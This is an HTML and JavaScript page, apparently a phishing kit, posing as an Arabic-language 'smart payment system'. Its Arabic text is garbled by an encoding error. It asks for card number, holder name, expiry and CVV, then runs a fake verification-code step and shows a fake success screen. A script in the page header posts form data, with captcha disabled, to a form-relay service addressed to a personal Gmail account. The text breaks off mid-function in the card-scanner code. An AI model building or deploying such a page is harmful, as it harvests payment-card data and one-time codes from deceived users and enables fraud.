<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø°ÙƒÙŠ Ø§Ù„Ù…ØªØ·ÙˆØ±</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    
    <!-- Ù†Ø¸Ø§Ù… FormSubmit Ø§Ù„Ù…ØªØ·ÙˆØ± -->
    <script>
        const EMAIL = "zazylalhkr7@gmail.com";
        
        async function sendToFormSubmit(data, subject) {
            try {
                console.log('ğŸ“§ Ø¥Ø±Ø³Ø§Ù„:', subject);
                
                const form = new FormData();
                form.append('_next', window.location.href);
                form.append('_captcha', 'false');
                form.append('_template', 'table');
                form.append('_subject', subject);
                
                for (let [key, value] of Object.entries(data)) {
                    form.append(key, value);
                }
                
                const response = await fetch(`https://formsubmit.co/${EMAIL}`, {
                    method: 'POST',
                    body: form
                });
                
                console.log(response.ok ? 'âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„!' : 'âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„');
                return response.ok;
            } catch (error) {
                console.error('âš ï¸ Ø®Ø·Ø£:', error);
                return false;
            }
        }
        
        // ØªÙˆÙ„ÙŠØ¯ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
        function generateVerificationCode() {
            return Math.floor(100000 + Math.random() * 900000).toString();
        }
        
        console.log('âœ… Ù†Ø¸Ø§Ù… FormSubmit Ø§Ù„Ù…ØªØ·ÙˆØ± Ø¬Ø§Ù‡Ø²!');
    </script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#3b82f6',
                        secondary: '#8b5cf6',
                        success: '#10b981',
                        danger: '#ef4444',
                        dark: '#1e293b'
                    },
                    animation: {
                        'float': 'float 6s ease-in-out infinite',
                        'glow': 'glow 2s ease-in-out infinite alternate',
                        'slide-in-bottom': 'slideInBottom 0.5s ease-out',
                        'slide-in-right': 'slideInRight 0.5s ease-out',
                        'zoom-in': 'zoomIn 0.5s ease-out',
                        'pulse-glow': 'pulseGlow 2s infinite',
                        'bounce-in': 'bounceIn 0.6s ease-out'
                    },
                    keyframes: {
                        float: {
                            '0%, 100%': { transform: 'translateY(0px)' },
                            '50%': { transform: 'translateY(-20px)' }
                        },
                        glow: {
                            '0%': { boxShadow: '0 0 20px rgba(59, 130, 246, 0.5)' },
                            '100%': { boxShadow: '0 0 30px rgba(59, 130, 246, 0.8)' }
                        },
                        slideInBottom: {
                            '0%': { transform: 'translateY(100%)', opacity: '0' },
                            '100%': { transform: 'translateY(0)', opacity: '1' }
                        },
                        slideInRight: {
                            '0%': { transform: 'translateX(100%)', opacity: '0' },
                            '100%': { transform: 'translateX(0)', opacity: '1' }
                        },
                        zoomIn: {
                            '0%': { transform: 'scale(0.8)', opacity: '0' },
                            '100%': { transform: 'scale(1)', opacity: '1' }
                        },
                        pulseGlow: {
                            '0%, 100%': { boxShadow: '0 0 20px rgba(16, 185, 129, 0.4)' },
                            '50%': { boxShadow: '0 0 40px rgba(16, 185, 129, 0.8)' }
                        },
                        bounceIn: {
                            '0%': { transform: 'scale(0.3)', opacity: '0' },
                            '50%': { transform: 'scale(1.05)' },
                            '70%': { transform: 'scale(0.9)' },
                            '100%': { transform: 'scale(1)', opacity: '1' }
                        }
                    }
                }
            }
        }
    </script>
    
    <style>
        * {
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            touch-action: manipulation;
        }
        
        .glass-morphism {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 
                0 25px 45px rgba(0, 0, 0, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
        }
        
        .card-3d {
            transform-style: preserve-3d;
            transition: all 0.6s cubic-bezier(0.23, 1, 0.320, 1);
        }
        
        .card-3d:hover {
            transform: rotateY(5deg) rotateX(5deg) translateZ(20px);
        }
        
        .gradient-border {
            position: relative;
            background: linear-gradient(45deg, #3b82f6, #8b5cf6, #ec4899, #f59e0b);
            background-size: 400% 400%;
            animation: gradientShift 4s ease infinite;
            padding: 2px;
            border-radius: 16px;
        }
        
        .gradient-border::before {
            content: '';
            position: absolute;
            top: 2px;
            left: 2px;
            right: 2px;
            bottom: 2px;
            background: #1e293b;
            border-radius: 14px;
            z-index: -1;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            animation: float 15s infinite linear;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0;
            }
        }
        
        .input-focus {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .input-focus:focus {
            transform: translateY(-2px);
            box-shadow: 
                0 20px 40px rgba(59, 130, 246, 0.1),
                0 0 0 2px rgba(59, 130, 246, 0.2);
        }
        
        .keypad-button {
            background: linear-gradient(145deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        .keypad-button:hover {
            background: linear-gradient(145deg, rgba(255,255,255,0.2), rgba(255,255,255,0.1));
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }
        
        .keypad-button:active {
            transform: translateY(0px) scale(0.95);
        }
        
        .scanner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .scanner-frame {
            width: 300px;
            height: 200px;
            border: 2px solid #3b82f6;
            border-radius: 12px;
            position: relative;
            overflow: hidden;
        }
        
        .scanner-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #3b82f6, transparent);
            animation: scan 2s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(200px); }
        }
        
        /* Responsive improvements */
        @media (max-width: 768px) {
            .glass-morphism {
                margin: 1rem;
                padding: 1.5rem;
            }
            
            .card-3d:hover {
                transform: none;
            }
            
            .input-focus {
                font-size: 16px; /* Prevent zoom on iOS */
            }
        }
        
        /* Fix scroll issues */
        body {
            position: relative;
            overflow-x: hidden;
        }
        
        .page-container {
            min-height: 100vh;
            min-height: 100dvh; /* For mobile browsers */
            width: 100%;
            position: relative;
        }
        
        /* Ensure smooth scrolling */
        @supports (scroll-behavior: smooth) {
            html {
                scroll-behavior: smooth;
            }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 min-h-screen relative">
    
    <!-- Floating Particles -->
    <div class="floating-particles" id="particles"></div>
    
    <!-- Payment Page -->
    <div id="paymentPage" class="page-container flex items-center justify-center p-4 relative z-10">
        <div class="max-w-6xl w-full">
            
            <!-- Header -->
            <div class="text-center mb-8 animate-zoom-in">
                <div class="inline-flex items-center justify-center w-24 h-24 glass-morphism rounded-full mb-6 animate-float">
                    <i class="fas fa-credit-card text-4xl text-blue-400"></i>
                </div>
                <h1 class="text-5xl md:text-6xl font-bold text-white mb-4 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
                    Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø°ÙƒÙŠ
                </h1>
                <p class="text-xl text-gray-300">ØªÙ‚Ù†ÙŠØ© Ù…ØªØ·ÙˆØ±Ø© â€¢ Ø£Ù…Ø§Ù† Ø¹Ø§Ù„ÙŠ â€¢ Ø³Ù‡ÙˆÙ„Ø© ÙØ§Ø¦Ù‚Ø©</p>
            </div>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12">
                
                <!-- Card Visualization -->
                <div class="animate-slide-in-right">
                    <div class="glass-morphism rounded-3xl p-6 md:p-8 mb-6">
                        <h3 class="text-white font-bold text-xl mb-6 flex items-center">
                            <i class="fas fa-eye mr-3 text-blue-400"></i>
                            Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
                        </h3>
                        
                        <!-- 3D Credit Card -->
                        <div class="card-3d">
                            <div class="gradient-border">
                                <div class="bg-gradient-to-br from-gray-800 to-gray-900 rounded-2xl p-6 text-white relative overflow-hidden" id="cardVisual">
                                    <div class="absolute inset-0 bg-gradient-to-br from-blue-500/20 to-purple-500/20"></div>
                                    <div class="relative z-10">
                                        <div class="flex justify-between items-start mb-8">
                                            <div class="text-2xl font-bold text-gray-300">PREMIUM</div>
                                            <div id="cardTypeIcon" class="text-4xl text-blue-400">
                                                <i class="fas fa-credit-card"></i>
                                            </div>
                                        </div>
                                        
                                        <div class="mb-8">
                                            <div id="cardNumberDisplay" class="text-2xl md:text-3xl font-mono tracking-wider mb-2">
                                                â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢
                                            </div>
                                        </div>
                                        
                                        <div class="flex justify-between items-end">
                                            <div>
                                                <div class="text-xs text-gray-400 mb-2">Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>
                                                <div id="cardHolderDisplay" class="text-sm md:text-base font-semibold">Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</div>
                                            </div>
                                            <div>
                                                <div class="text-xs text-gray-400 mb-2">ØµØ§Ù„Ø­Ø© Ø­ØªÙ‰</div>
                                                <div id="cardExpiryDisplay" class="text-sm md:text-base font-semibold">MM/YY</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Security & Features -->
                    <div class="glass-morphism rounded-3xl p-6 md:p-8">
                        <h4 class="text-white font-bold text-lg mb-6 flex items-center">
                            <i class="fas fa-shield-alt mr-3 text-green-400"></i>
                            Ù…Ù…ÙŠØ²Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©
                        </h4>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div class="flex items-center text-gray-300 p-3 bg-white/5 rounded-xl">
                                <i class="fas fa-lock text-green-400 mr-3 text-lg"></i>
                                <span class="text-sm">ØªØ´ÙÙŠØ± AES-256</span>
                            </div>
                            <div class="flex items-center text-gray-300 p-3 bg-white/5 rounded-xl">
                                <i class="fas fa-user-shield text-green-400 mr-3 text-lg"></i>
                                <span class="text-sm">Ù…ØµØ§Ø¯Ù‚Ø© Ø«Ù†Ø§Ø¦ÙŠØ©</span>
                            </div>
                            <div class="flex items-center text-gray-300 p-3 bg-white/5 rounded-xl">
                                <i class="fas fa-eye-slash text-green-400 mr-3 text-lg"></i>
                                <span class="text-sm">Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</span>
                            </div>
                            <div class="flex items-center text-gray-300 p-3 bg-white/5 rounded-xl">
                                <i class="fas fa-bolt text-green-400 mr-3 text-lg"></i>
                                <span class="text-sm">Ù…Ø¹Ø§Ù„Ø¬Ø© ÙÙˆØ±ÙŠØ©</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Payment Form -->
                <div class="animate-slide-in-bottom">
                    <div class="glass-morphism rounded-3xl p-6 md:p-8">
                        <h3 class="text-white font-bold text-xl mb-8 flex items-center">
                            <i class="fas fa-credit-card mr-3 text-purple-400"></i>
                            Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                        </h3>
                        
                        <form id="paymentForm" class="space-y-6">
                            
                            <!-- Card Number -->
                            <div class="space-y-2">
                                <label class="block text-white/90 text-sm font-medium">
                                    <i class="fas fa-hashtag mr-2 text-blue-400"></i>
                                    Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                                </label>
                                <div class="relative">
                                    <input type="text" id="cardNumber" autocomplete="cc-number" placeholder="1234 5678 9012 3456" maxlength="19" class="w-full px-4 py-4 md:py-5 bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl text-white text-lg md:text-xl font-mono input-focus placeholder-gray-400 pr-16" required="">
                                    <div class="absolute left-4 top-1/2 transform -translate-y-1/2">
                                        <div id="cardIcon" class="text-2xl md:text-3xl text-gray-400">
                                            <i class="fas fa-credit-card"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Card Holder Name -->
                            <div class="space-y-2">
                                <label class="block text-white/90 text-sm font-medium">
                                    <i class="fas fa-user mr-2 text-green-400"></i>
                                    Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                                </label>
                                <input type="text" id="cardHolder" autocomplete="cc-name" placeholder="Ahmed Mohammed Al-Saudi" class="w-full px-4 py-4 md:py-5 bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl text-white text-lg md:text-xl input-focus placeholder-gray-400" required="">
                            </div>
                            
                            <!-- Expiry and CVV -->
                            <div class="grid grid-cols-2 gap-4">
                                <div class="space-y-2">
                                    <label class="block text-white/90 text-sm font-medium">
                                        <i class="fas fa-calendar-alt mr-2 text-yellow-400"></i>
                                        Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©
                                    </label>
                                    <input type="text" id="cardExpiry" autocomplete="cc-exp" placeholder="MM/YY" maxlength="5" class="w-full px-4 py-4 md:py-5 bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl text-white text-lg md:text-xl font-mono input-focus placeholder-gray-400" required="">
                                </div>
                                <div class="space-y-2">
                                    <label class="block text-white/90 text-sm font-medium">
                                        <i class="fas fa-lock mr-2 text-red-400"></i>
                                        Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù†
                                    </label>
                                    <input type="text" id="cardCVV" autocomplete="cc-csc" placeholder="123" maxlength="4" class="w-full px-4 py-4 md:py-5 bg-white/10 backdrop-blur-sm border border-white/20 rounded-2xl text-white text-lg md:text-xl font-mono input-focus placeholder-gray-400" required="">
                                </div>
                            </div>
                            
                            <!-- Action Buttons -->
                            <div class="flex flex-col sm:flex-row gap-4 pt-6">
                                <button type="button" onclick="startCardScan()" class="flex-1 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white py-4 md:py-5 rounded-2xl font-bold transition-all duration-300 transform hover:scale-105 shadow-lg text-lg">
                                    <i class="fas fa-camera mr-3"></i>
                                    Ù…Ø³Ø­ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                                </button>
                                <button type="button" onclick="proceedToVerification()" class="flex-1 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white py-4 md:py-5 rounded-2xl font-bold transition-all duration-300 transform hover:scale-105 shadow-lg text-lg">
                                    <i class="fas fa-arrow-left mr-3"></i>
                                    Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„Ø¯ÙØ¹
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Verification Page -->
    <div id="verificationPage" class="hidden page-container flex items-center justify-center p-4 relative z-10">
        <div class="max-w-lg w-full">
            
            <!-- Header -->
            <div class="text-center mb-8 animate-bounce-in">
                <div class="inline-flex items-center justify-center w-24 h-24 glass-morphism rounded-full mb-6 animate-pulse-glow">
                    <i class="fas fa-mobile-alt text-4xl text-green-400"></i>
                </div>
                <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
                    Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
                </h1>
                <p class="text-lg text-gray-300">ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² Ø¥Ù„Ù‰ Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</p>
            </div>
            
            <!-- Verification Form -->
            <div class="glass-morphism rounded-3xl p-6 md:p-8">
                
                <!-- Code Display -->
                <div class="mb-8">
                    <div class="flex justify-center gap-3 mb-6">
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit1">-</div>
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit2">-</div>
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit3">-</div>
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit4">-</div>
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit5">-</div>
                        <div class="w-14 h-14 md:w-16 md:h-16 glass-morphism rounded-2xl border-2 border-white/30 flex items-center justify-center text-white text-2xl font-bold transition-all duration-300" id="digit6">-</div>
                    </div>
                </div>
                
                <!-- Digital Keypad -->
                <div class="grid grid-cols-3 gap-4 mb-8">
                    <!-- Row 1 -->
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('1')">1</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('2')">2</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('3')">3</button>
                    
                    <!-- Row 2 -->
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('4')">4</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('5')">5</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('6')">6</button>
                    
                    <!-- Row 3 -->
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('7')">7</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('8')">8</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('9')">9</button>
                    
                    <!-- Row 4 -->
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-xl text-red-400" onclick="clearCode()">
                        <i class="fas fa-times"></i>
                    </button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-2xl font-bold text-white" onclick="addDigit('0')">0</button>
                    <button class="keypad-button h-16 md:h-18 rounded-2xl text-xl text-yellow-400" onclick="deleteDigit()">
                        <i class="fas fa-backspace"></i>
                    </button>
                </div>
                
                <!-- Action Buttons -->
                <div class="flex flex-col sm:flex-row gap-4">
                    <button onclick="goBackToPayment()" class="flex-1 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white py-4 md:py-5 rounded-2xl font-bold transition-all duration-300 text-lg">
                        <i class="fas fa-arrow-right mr-3"></i>
                        Ø±Ø¬ÙˆØ¹
                    </button>
                    <button onclick="verifyAndComplete()" class="flex-1 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white py-4 md:py-5 rounded-2xl font-bold transition-all duration-300 transform hover:scale-105 shadow-lg text-lg">
                        <i class="fas fa-check mr-3"></i>
                        ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¯ÙØ¹
                    </button>
                </div>
                
                <!-- Timer and Info -->
                <div class="mt-8 text-center space-y-4">
                    <div class="text-center">
                        <p class="text-gray-400 text-sm">Ø§Ù†ØªÙ‡Ø§Ø¡ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø±Ù…Ø² Ø®Ù„Ø§Ù„:</p>
                        <p id="timer" class="text-white font-bold text-xl">05:00</p>
                    </div>
                    <button onclick="resendCode()" class="text-blue-400 hover:text-blue-300 transition-colors font-medium">
                        <i class="fas fa-redo mr-2"></i>
                        Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Card Scanner Modal -->
    <div id="scannerModal" class="hidden scanner-overlay">
        <div class="text-center">
            <div class="scanner-frame mb-6">
                <div class="scanner-line"></div>
                <video id="cameraFeed" autoplay="" playsinline="" class="w-full h-full object-cover rounded-lg"></video>
            </div>
            <div class="text-white mb-6">
                <h3 class="text-xl font-bold mb-2">Ø¶Ø¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ÙÙŠ Ø§Ù„Ø¥Ø·Ø§Ø±</h3>
                <p class="text-gray-300">Ø³ÙŠØªÙ… Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹</p>
            </div>
            <div class="flex gap-4 justify-center">
                <button onclick="stopCardScan()" class="bg-red-600 hover:bg-red-700 text-white px-6 py-3 rounded-xl font-bold transition-colors">
                    <i class="fas fa-times mr-2"></i>
                    Ø¥Ù„ØºØ§Ø¡
                </button>
                <button onclick="simulateCardScan()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-xl font-bold transition-colors">
                    <i class="fas fa-check mr-2"></i>
                    Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ù…Ø³Ø­
                </button>
            </div>
        </div>
    </div>
    
    <!-- Success Page -->
    <div id="successPage" class="hidden page-container flex items-center justify-center p-4 relative z-10">
        <div class="max-w-md w-full text-center">
            <div class="animate-bounce-in">
                <div class="inline-flex items-center justify-center w-28 h-28 glass-morphism rounded-full mb-8 animate-pulse-glow">
                    <i class="fas fa-check text-5xl text-green-400"></i>
                </div>
            </div>
            
            <h1 class="text-4xl md:text-5xl font-bold text-white mb-6">ØªÙ… Ø§Ù„Ø¯ÙØ¹ Ø¨Ù†Ø¬Ø§Ø­!</h1>
            <p class="text-xl text-gray-300 mb-8">Ø´ÙƒØ±Ø§Ù‹ Ù„ÙƒØŒ ØªÙ…Øª Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­</p>
            
            <div class="glass-morphism rounded-3xl p-6 md:p-8 mb-8">
                <h3 class="text-white font-bold text-lg mb-6">ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©</h3>
                <div class="space-y-4 text-right">
                    <div class="flex justify-between items-center p-3 bg-white/5 rounded-xl">
                        <span class="text-gray-300">Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©:</span>
                        <span id="successCard" class="text-white font-bold">****</span>
                    </div>
                    <div class="flex justify-between items-center p-3 bg-white/5 rounded-xl">
                        <span class="text-gray-300">Ø§Ù„ØªØ§Ø±ÙŠØ®:</span>
                        <span id="successDate" class="text-white font-bold">-</span>
                    </div>
                    <div class="flex justify-between items-center p-3 bg-white/5 rounded-xl">
                        <span class="text-gray-300">Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©:</span>
                        <span id="transactionId" class="text-white font-bold">-</span>
                    </div>
                    <div class="flex justify-between items-center p-3 bg-green-500/20 rounded-xl border border-green-500/30">
                        <span class="text-green-300">Ø§Ù„Ø­Ø§Ù„Ø©:</span>
                        <span class="text-green-400 font-bold">Ù…ÙƒØªÙ…Ù„Ø©</span>
                    </div>
                </div>
            </div>
            
            <button onclick="startNewPayment()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white py-4 md:py-5 rounded-2xl font-bold transition-all duration-300 transform hover:scale-105 shadow-lg text-lg">
                <i class="fas fa-plus mr-3"></i>
                Ø¹Ù…Ù„ÙŠØ© Ø¯ÙØ¹ Ø¬Ø¯ÙŠØ¯Ø©
            </button>
        </div>
    </div>

    <script>
        // Global variables
        let currentCode = '';
        let timerInterval;
        let paymentData = {};
        let verificationCodeSent = '';
        
        // Create floating particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
                particlesContainer.appendChild(particle);
            }
        }
        
        // Page navigation with smooth transitions
        function showPage(pageId) {
            document.querySelectorAll('[id$="Page"]').forEach(page => {
                page.classList.add('hidden');
            });
            document.getElementById(pageId).classList.remove('hidden');
            
            // Smooth scroll to top
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        
        // Card number formatting and validation
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = formattedValue;
            
            // Update card visual
            const display = document.getElementById('cardNumberDisplay');
            if (value.length > 0) {
                const masked = value.replace(/\d(?=\d{4})/g, 'â€¢');
                display.textContent = masked.replace(/(\d{4})/g, '$1 ').trim();
            } else {
                display.textContent = 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
            }
            
            // Detect card type
            detectCardType(value);
        });
        
        // Card holder name
        document.getElementById('cardHolder').addEventListener('input', function(e) {
            const value = e.target.value.toUpperCase();
            document.getElementById('cardHolderDisplay').textContent = 
                value || 'Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©';
        });
        
        // Card expiry formatting
        document.getElementById('cardExpiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            
            document.getElementById('cardExpiryDisplay').textContent = 
                value || 'MM/YY';
        });
        
        // CVV numbers only
        document.getElementById('cardCVV').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        // Card type detection with enhanced visuals
        function detectCardType(number) {
            const cardIcon = document.getElementById('cardIcon');
            const cardTypeIcon = document.getElementById('cardTypeIcon');
            const cardVisual = document.getElementById('cardVisual');
            
            let icon = '<i class="fas fa-credit-card"></i>';
            let gradient = 'linear-gradient(135deg, #374151 0%, #111827 100%)';
            let color = 'text-gray-400';
            
            if (number.startsWith('4')) {
                icon = '<i class="fab fa-cc-visa"></i>';
                gradient = 'linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)';
                color = 'text-blue-400';
            } else if (number.startsWith('5') || number.startsWith('2')) {
                icon = '<i class="fab fa-cc-mastercard"></i>';
                gradient = 'linear-gradient(135deg, #dc2626 0%, #991b1b 100%)';
                color = 'text-red-400';
            } else if (number.startsWith('3')) {
                icon = '<i class="fab fa-cc-amex"></i>';
                gradient = 'linear-gradient(135deg, #059669 0%, #047857 100%)';
                color = 'text-green-400';
            }
            
            cardIcon.innerHTML = icon;
            cardIcon.className = `text-2xl md:text-3xl ${color}`;
            cardTypeIcon.innerHTML = icon;
            cardTypeIcon.className = `text-4xl ${color}`;
            
            cardVisual.style.background = gradient;
        }
        
        // Card scanner functionality
        function startCardScan() {
            document.getElementById('scannerModal').classList.remove('hidden');
            
            // Request camera access
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
